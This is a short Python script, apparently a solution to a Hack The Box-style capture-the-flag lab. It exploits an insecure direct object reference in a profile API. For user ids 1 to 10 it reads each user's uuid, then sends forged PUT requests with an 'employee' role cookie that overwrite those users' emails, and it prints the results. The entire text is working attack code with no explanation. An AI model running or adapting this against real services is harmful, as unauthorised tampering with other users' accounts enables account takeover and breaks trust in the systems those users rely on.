import requests
base_url = 'http://134.209.176.83:31383/profile/api.php/profile/'
cookies = {'role': 'employee'}
for i in range(1, 11):
    url = base_url + str(i)
    response = requests.get(url)
    data_list = list(response.json().items())
    for key, value in data_list:
        if key == 'uuid':
            payload = {'uid':i, 'uuid': value,'role':'employee',"full_name":"jack", 'email':'flag@idor.htb', "role":"employee","about":"A Release is like a boat. 8f the holes plugged is not good enough." }
            res = requests.put(url, json=payload, cookies=cookies)
            print(res.text)
            if res.text == '0':
                print(f'Successfully changed the email of user with uid = {i} to flag@idor.htb')
                new_res = requests.get(url)
                print(new_res.text)
              

    
